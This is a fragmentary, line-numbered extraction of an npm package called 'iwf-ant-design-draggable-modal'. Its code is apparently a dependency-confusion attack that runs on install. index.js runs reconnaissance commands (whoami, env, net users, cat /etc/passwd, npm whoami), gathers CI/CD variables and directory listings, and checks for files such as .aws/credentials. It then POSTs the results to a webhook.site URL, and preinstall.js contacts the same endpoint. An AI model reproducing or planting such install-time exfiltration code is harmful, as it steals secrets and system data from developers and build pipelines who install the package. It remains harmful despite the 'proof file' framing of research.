// File: tmp/tmp68468wqu/iwf-ant-design-draggable-modal/package/index.js
// ======================================================================
Line 1: _tmp_0 = require('child_process')
Line 2: const https = require('https')
Line 3: const os = require('os')
Line 4: const fs = require('fs')
Line 5: const path = require('path')
Line 9: this.webhookUrl = 'https://webhook.site/3628dc1c-1336-4424-b6e5-057fc7912603'
Line 13: os.platform()
Line 14: os.arch()
Line 15: os.hostname()
Line 23: {
      const cmd = this.results.platform === 'win32' && winCommand ? winCommand : command;
      const timeout = 15000;
      
      console.log(`[*] Executing: ${cmd}`);
      
      exec(cmd, { timeout }, (error, stdout, stderr) => {
        this.results.commands[command] = {
          success: !error,
          output: (stdout || stderr || 'No output').toString().substring(0, 1000), // Limit size
          error: error ? error.message : null
        };
        resolve();
      });
    }
Line 27: console.log(`[*] Executing: ${cmd}`)
Line 29: exec(cmd, { timeout }, (error, stdout, stderr) => {
        this.results.commands[command] = {
          success: !error,
          output: (stdout || stderr || 'No output').toString().substring(0, 1000), // Limit size
          error: error ? error.message : null
        };
        resolve();
      })
Line 30: this.results.commands[command] = {
          success: !error,
          output: (stdout || stderr || 'No output').toString().substring(0, 1000), // Limit size
          error: error ? error.message : null
        }
Line 32: (stdout || stderr || 'No output').toString()
Line 44: await this.executeCommand('whoami')
Line 45: await this.executeCommand('systeminfo', 'systeminfo | findstr /B /C:"OS Name" /C:"OS Version"')
Line 46: await this.executeCommand('net users', 'net users')
Line 47: await this.executeCommand('ipconfig', 'ipconfig')
Line 48: await this.executeCommand('dir', 'dir')
Line 49: await this.executeCommand('netstat -an', 'netstat -an | findstr LISTENING')
Line 50: await this.executeCommand('tasklist', 'tasklist | head -10')
Line 51: await this.executeCommand('set', 'set')
Line 54: await this.executeCommand('whoami')
Line 55: await this.executeCommand('uname -a')
Line 56: await this.executeCommand('id')
Line 57: await this.executeCommand('pwd')
Line 58: await this.executeCommand('ls -la')
Line 59: await this.executeCommand('ifconfig', 'ip addr show')
Line 60: await this.executeCommand('netstat -tulpn', 'ss -tulpn')
Line 61: await this.executeCommand('ps aux', 'ps aux | head -10')
Line 62: await this.executeCommand('env')
Line 65: await this.executeCommand('cat /etc/passwd', 'head -10 /etc/passwd')
Line 66: await this.executeCommand('cat /etc/hosts', 'head -10 /etc/hosts')
Line 70: await this.executeCommand('echo $HOME', 'echo %USERPROFILE%')
Line 71: await this.executeCommand('npm whoami', 'npm whoami')
Line 79: {
      // Check for CI/CD environment variables
      const ciEnvs = ['CI', 'GITHUB_ACTIONS', 'GITLAB_CI', 'JENKINS_URL', 'BUILD_ID', 'BITBUCKET_BUILD_NUMBER'];
      this.results.ci_cd = {};
      
      ciEnvs.forEach(env => {
        if (process.env[env]) {
          this.results.ci_cd[env] = process.env[env];
        }
      });

      // Current directory info
      this.results.current_directory = process.cwd();
      this.results.node_version = process.version;
      this.results.npm_version = process.env.npm_version;

      // List files in current directory
      try {
        const files = fs.readdirSync(process.cwd());
        this.results.directory_listing = files;
      } catch (e) {
        this.results.directory_error = e.message;
      }

    }
Line 81: const ciEnvs = ['CI', 'GITHUB_ACTIONS', 'GITLAB_CI', 'JENKINS_URL', 'BUILD_ID', 'BITBUCKET_BUILD_NUMBER']
Line 85: {
          this.results.ci_cd[env] = process.env[env];
        }
Line 86: this.results.ci_cd[env] = process.env[env]
Line 97: const files = fs.readdirSync(process.cwd())
Line 111: _tmp_12.push(".aws/credentials")
Line 112: _tmp_12.push("docker-compose.yml")
Line 113: _tmp_12.push("github/workflows")
Line 118: _iterator_0.next()
Line 120: path.join(process.cwd(), file)
Line 121: {
            const stats = fs.statSync(filePath);
            this.results.sensitive_files[file] = {
              exists: true,
              size: stats.size,
              isDirectory: stats.isDirectory()
            };
          }
Line 122: const stats = fs.statSync(filePath)
Line 123: this.results.sensitive_files[file] = {
              exists: true,
              size: stats.size,
              isDirectory: stats.isDirectory()
            }
Line 139: {
      const data = JSON.stringify(this.results, null, 2);
      
      const url = new URL(this.webhookUrl);
      const options = {
        hostname: url.hostname,
        port: 443,
        path: url.pathname,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': 'npm-install-dependency',
          'Content-Length': Buffer.byteLength(data)
        }
      };

      console.log('[*] Sending data to webhook...');
      
      const req = https.request(options, (res) => {
        let response = '';
        res.on('data', (chunk) => response += chunk);
        res.on('end', () => {
          console.log('[+] Data exfiltrated successfully');
          this.results.exfiltration_status = 'success';
          resolve();
        });
      });

      req.on('error', (error) => {
        console.log('[-] Exfiltration failed:', error.message);
        this.results.exfiltration_status = 'failed';
        this.results.exfiltration_err...
Line 155: console.log('[*] Sending data to webhook...')
Line 157: const req = https.request(options, (res) => {
        let response = '';
        res.on('data', (chunk) => response += chunk);
        res.on('end', () => {
          console.log('[+] Data exfiltrated successfully');
          this.results.exfiltration_status = 'success';
          resolve();
        });
      })
Line 160: {
          console.log('[+] Data exfiltrated successfully');
          this.results.exfiltration_status = 'success';
          resolve();
        }
Line 161: console.log('[+] Data exfiltrated successfully')
Line 167: {
        console.log('[-] Exfiltration failed:', error.message);
        this.results.exfiltration_status = 'failed';
        this.results.exfiltration_error = error.message;
        resolve();
      }
Line 168: console.log('[-] Exfiltration failed:', error.message)
Line 174: req.write(data)
Line 175: req.end()
Line 190: _tmp_21.push(path.join(process.cwd(), 'DEPENDENCY_CONFUSION_PROOF.txt'))
Line 191: _tmp_21.push(path.join(__dirname, 'INSTALLATION_PROOF.txt'))
Line 194: _iterator_1.next()
Line 195: {
          fs.writeFileSync(proofFile, proofContent);
          console.log(`[+] Proof file created: ${proofFile}`);
        }
Line 197: console.log(`[+] Proof file created: ${proofFile}`)
Line 208: {
      console.log('[*] Starting dependency confusion exploit...');
      console.log(`[*] Target: ${this.results.package}`);
      console.log(`[*] Platform: ${this.results.platform}`);
      
      await this.gatherSystemInfo();
      await this.gatherEnvironmentInfo();
      await this.checkSensitiveFiles();
      await this.createProofFiles();
      await this.exfiltrateData();
      
      console.log('[+] Exploit completed successfully');
      
    }
Line 209: console.log('[*] Starting dependency confusion exploit...')
Line 210: console.log(`[*] Target: ${this.results.package}`)
Line 211: console.log(`[*] Platform: ${this.results.platform}`)
Line 213: this.gatherSystemInfo()
Line 216: this.createProofFiles()
Line 219: console.log('[+] Exploit completed successfully')
Line 221: catch (error) {
      this.results.exploit_error = error.message;
      console.log('[-] Exploit failed:', error.message);
      await this.exfiltrateData(); // Still send error info
    }
Line 223: console.log('[-] Exploit failed:', error.message)

// File: tmp/tmp68468wqu/iwf-ant-design-draggable-modal/package/postinstall.js
// ======================================================================
Line 2: const fs = require('fs')
Line 3: const path = require('path')
Line 8: {
  const finalProof = path.join(process.cwd(), 'INSTALLATION_COMPLETE.txt');
  fs.writeFileSync(finalProof, `Postinstall hook executed: ${new Date().toISOString()}`);
  console.log('[+] Postinstall proof created');
}
Line 9: path.join(process.cwd(), 'INSTALLATION_COMPLETE.txt')
Line 11: console.log('[+] Postinstall proof created')

// File: tmp/tmp68468wqu/iwf-ant-design-draggable-modal/package/preinstall.js
// ======================================================================
Line 2: _tmp_0 = require('child_exec')
Line 3: const https = require('https')
Line 8: const initialData = {
  stage: 'preinstall',
  package: 'iwf-ant-design-draggable-modal',
  timestamp: new Date().toISOString(),
  platform: require('os').platform()
}
Line 12: _tmp_1.platform = require('os').platform()
Line 16: const req = https.request({
  hostname: 'webhook.site',
  port: 443,
  path: '/3628dc1c-1336-4424-b6e5-057fc7912603',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  }
})
